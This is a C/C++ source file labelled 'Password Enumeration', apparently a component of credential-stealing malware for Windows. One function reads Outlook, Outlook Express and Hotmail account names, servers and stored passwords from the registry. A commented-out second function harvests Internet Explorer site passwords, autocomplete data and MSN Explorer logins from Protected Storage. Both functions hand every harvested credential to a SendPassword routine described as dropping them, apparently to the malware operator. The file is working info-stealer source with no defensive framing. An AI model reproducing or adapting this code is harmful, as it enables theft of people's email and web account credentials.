
// also take a look at http://www.codeproject.com/KB/applications/HirPStorage.aspx


/* Password Enumeration */

#include "Windows.h"
#include "Config.h"

void EnumOutlookAccounts();
int  EnumProtectedStorage();

typedef struct TOOUTDATA{
        char POPuser[100];
        char POPpass[100];
        char POPserver[100];
} OOUTDATA;

OOUTDATA OutlookData[50];
int oIndex=0;

// Outlook 2003, 2007 (LADP Server)
// Microsoft Outlook Express 5.0
// Microsoft Outlook Express 4.01 Service Pack 1
// Microsoft Outlook Express 4.01 Service Pack 2
// Microsoft Outlook Express 4.0

void EnumOutlookAccounts()
{
	ZeroMemory(OutlookData,sizeof(OutlookData));
	HKEY hkeyresult ,hkeyresult1;
	long l,i;
	char name[200],skey[200];
	DWORD dw2;
	FILETIME f;

	strcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
	LONG lResult=RegOpenKeyExA(HKEY_CURRENT_USER, skey,0,KEY_ALL_ACCESS, &hkeyresult1 );

    if (RegOpenKeyExA(HKEY_CURRENT_USER, skey,0,KEY_ALL_ACCESS, &hkeyresult1) != ERROR_SUCCESS &&
        RegOpenKeyExA(HKEY_LOCAL_MACHINE, skey,0,KEY_ALL_ACCESS, &hkeyresult1) != ERROR_SUCCESS )
		return;

	i=0;l=0;
	BYTE Data[150];
	BYTE Data1[150];
	DWORD size;
	int j;
	j=0;
	DWORD type=REG_BINARY;
	while(l!=ERROR_NO_MORE_ITEMS){
	dw2=200;

	l=RegEnumKeyExA(hkeyresult1,i,name,&dw2,NULL,NULL,NULL,&f);
	strcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
	strcat(skey,"\\");
	strcat(skey,name);

	RegOpenKeyExA(HKEY_CURRENT_USER, skey ,0,KEY_ALL_ACCESS, &hkeyresult );
	size=sizeof(Data);
	if(RegQueryValueExA( hkeyresult, "HTTPMail User Name" , 0, &type, Data, &size )==ERROR_SUCCESS)
	{
		strcpy(OutlookData[oIndex].POPuser,(char *)Data);
		ZeroMemory(Data,sizeof(Data));
		strcpy(OutlookData[oIndex].POPserver,"Hotmail");
		size=sizeof(Data);
		if(RegQueryValueExA( hkeyresult, "HTTPMail Password2" , 0, &type, Data1, &size ) ==ERROR_SUCCESS){
			int totnopass=0;
			for(unsigned i=2;i<size;i++)
			if(IsCharAlphaNumericA(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-')){
				OutlookData[oIndex].POPpass[totnopass]=Data1[i];
				totnopass++;
			}
			OutlookData[oIndex].POPpass[totnopass]=0;
		}
		ZeroMemory(Data1,sizeof(Data));
		oIndex++;
	}
	else if(RegQueryValueExA( hkeyresult, "POP3 User Name" , 0, &type, Data, &size )==ERROR_SUCCESS)
	{
		strcpy(OutlookData[oIndex].POPuser,(char *)Data);
		ZeroMemory(Data,sizeof(Data));
		size=sizeof(Data);
		RegQueryValueExA( hkeyresult, "POP3 Server" , 0, &type, Data, &size );
		strcpy(OutlookData[oIndex].POPserver,(char *)Data);
		ZeroMemory(Data,sizeof(Data));
		size=sizeof(Data);
		if(RegQueryValueExA( hkeyresult, "POP3 Password2" , 0, &type, Data1, &size ) ==ERROR_SUCCESS){
			int totnopass=0;
			for(unsigned i=2;i<size;i++)
				if(IsCharAlphaNumericA(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-')){
					OutlookData[oIndex].POPpass[totnopass]=Data1[i];
					totnopass++;
				}
				OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data1));
			oIndex++;
		}
		j++;i++;
	}

    // drop them
    for (int n = 0; n < oIndex; n++)
        SendPassword(Password_Outlook, OutlookData[oIndex].POPserver, OutlookData[oIndex].POPuser, OutlookData[oIndex].POPpass);

}


/*
#import <pstorec.dll> no_namespace

// only Windows XP!

int EnumProtectedStorage()
{
    CoInitialize(NULL);
	typedef HRESULT (WINAPI *tPStoreCreateInstance)(IPStore **, DWORD, DWORD, DWORD);
	HMODULE hpsDLL; 
	hpsDLL = LoadLibraryA("pstorec.dll");
    if (!hpsDLL)
        return 0;

	tPStoreCreateInstance pPStoreCreateInstance;
	pPStoreCreateInstance = (tPStoreCreateInstance)GetProcAddress(hpsDLL, "PStoreCreateInstance");

	IPStorePtr PStore; 
	HRESULT hRes = pPStoreCreateInstance(&PStore, 0, 0, 0); 

	IEnumPStoreTypesPtr EnumPStoreTypes;
	hRes = PStore->EnumTypes(0, 0, &EnumPStoreTypes);

	if (!FAILED(hRes))
	{
		GUID TypeGUID;
		char szItemName[512];	   
		char szItemData[512];
		char szResName[1512];
		char szResData[512];
		char szItemGUID[50];

        while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK){	  
			wsprintfA(szItemGUID,"%x",TypeGUID);
			IEnumPStoreTypesPtr EnumSubTypes;
			hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);
	  
			GUID subTypeGUID;
			while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK){

				IEnumPStoreItemsPtr spEnumItems;
				HRESULT hRes = PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);

				LPWSTR itemName;
				while(spEnumItems->raw_Next(1,&itemName,0) == S_OK){			 
					wsprintfA(szItemName,"%ws",itemName);
					char chekingdata[200];
					unsigned long psDataLen = 0;
					unsigned char *psData = NULL;
					_PST_PROMPTINFO *pstiinfo = NULL;
					hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
					if((unsigned)lstrlenA((char *)psData) < (psDataLen-1))
					{
						int i=0;
						for(unsigned m=0;m<psDataLen;m+=2){
							if(psData[m]==0)
								szItemData[i]=',';
							else
								szItemData[i]=psData[m];
						i++;
					}
					szItemData[i-1]=0;							  
				}
				else {							
					wsprintfA(szItemData,"%s",psData);				  
				}	
					lstrcpyA(szResName,"");
					lstrcpyA(szResData,"");
					//220d5cc1 Outlooks
					if(lstrcmpA(szItemGUID,"220d5cc1")==0){
						BOOL bDeletedOEAccount=TRUE;
                        int i = 0;
						for(i=0;i<oIndex;i++){				  
							if(lstrcmpA(OutlookData[i].POPpass,szItemName)==0){				   			
								bDeletedOEAccount=FALSE;

                                SendPassword(Password_Outlook, OutlookData[i].POPserver, OutlookData[i].POPuser, szItemData);
								GatheredData[gIndex].rType = "Outlook Express";
								GatheredData[gIndex].rName = OutlookData[i].POPserver;
								GatheredData[gIndex].rUser = OutlookData[i].POPuser;
								GatheredData[gIndex].rPass = szItemData;
								gIndex++;

								break;
							}
						}
						if(bDeletedOEAccount) {

                            SendPassword(Password_Outlook, szItemName, OutlookData[i].POPuser, szItemData);
							GatheredData[gIndex].rType = "Deleted OE Account";
							GatheredData[gIndex].rName = szItemName;
							GatheredData[gIndex].rUser = OutlookData[i].POPuser;
							GatheredData[gIndex].rPass = szItemData;
							gIndex++;

						}
					}				 
					//5e7e8100 - IE:Password-Protected sites
					if(lstrcmpA(szItemGUID,"5e7e8100")==0){				  
						lstrcpyA(chekingdata,"");
						if(strstr(szItemData,":")!=0){
							lstrcpyA(chekingdata,strstr(szItemData,":")+1);
							*(strstr(szItemData,":"))=0;				  
						}

                        SendPassword(Password_Outlook, szItemName, szItemData, chekingdata);
						GatheredData[gIndex].rType = "IE: Site Password";
						GatheredData[gIndex].rName = szItemName;
						GatheredData[gIndex].rUser = szItemData;
						GatheredData[gIndex].rPass = chekingdata;
						gIndex++;

					}
					//	  b9819c52 MSN Explorer Signup
					if(lstrcmpA(szItemGUID,"b9819c52")==0){
						char msnid[100];
						char msnpass[100];
						int i=0;
						BOOL first=TRUE;
						for(unsigned m=0;m<psDataLen;m+=2){
							if(psData[m]==0){									
								szItemData[i]=',';					
								i++;
						}
						else{
							if(IsCharAlphaNumeric(psData[m])||(psData[m]=='@')||(psData[m]=='.')||(psData[m]=='_')){
								szItemData[i]=psData[m];					
								i++;
							}							
						}
					}
					szItemData[i-1]=0;
					char *p;
					p=szItemData+2;
					//psData[4] - number of msn accounts 
					for(int ii=0;ii<psData[4];ii++){
						lstrcpyA(msnid,p+1);
						if(strstr(msnid,",")!=0) *strstr(msnid,",")=0;
							if(strstr(p+1,",")!=0)
								lstrcpyA(msnpass,strstr(p+1,",")+2);				
						if(strstr(msnpass,",")!=0) *strstr(msnpass,",")=0;									
						p=strstr(p+1,",")+2+lstrlenA(msnpass)+7;

                        SendPassword(Password_Outlook, msnid, msnid, msnpass);
						GatheredData[gIndex].rType = "MSN Explorer";
						GatheredData[gIndex].rName = msnid;
						GatheredData[gIndex].rUser = msnid;
						GatheredData[gIndex].rPass = msnpass;
						gIndex++;

					}

				}
				//e161255a IE 
				if(lstrcmpA(szItemGUID,"e161255a")==0){
					if(strstr(szItemName,"StringIndex")==0){
						if(strstr(szItemName,":String")!=0) *strstr(szItemName,":String")=0;			  
						lstrcpynA(chekingdata,szItemName,8);			  
						if((strstr(chekingdata,"http:/")==0)&&(strstr(chekingdata,"https:/")==0)) {

                            SendPassword(Password_Outlook, szItemName, szItemName, szItemData);
							GatheredData[gIndex].rType = "IE: AutoComplete";
							GatheredData[gIndex].rName = szItemName;
							GatheredData[gIndex].rUser = szItemName;
							GatheredData[gIndex].rPass = szItemData;
							gIndex++;

						}
					}else{
							lstrcpyA(chekingdata,"");
							if(strstr(szItemData,",")!=0){
								lstrcpyA(chekingdata,strstr(szItemData,",")+1);
								*(strstr(szItemData,","))=0;				  
							}

                            SendPassword(Password_Outlook, szItemName, szItemData, chekingdata);
							GatheredData[gIndex].rType = "AutoComplete Password";
							GatheredData[gIndex].rName = szItemName;
							GatheredData[gIndex].rUser = szItemData;
							GatheredData[gIndex].rPass = chekingdata;
							gIndex++;

						}
					}
					ZeroMemory(szItemName,sizeof(szItemName));
					ZeroMemory(szItemData,sizeof(szItemData));			  
				}		  
			}			
		}
	}
	return 1;
}
*/
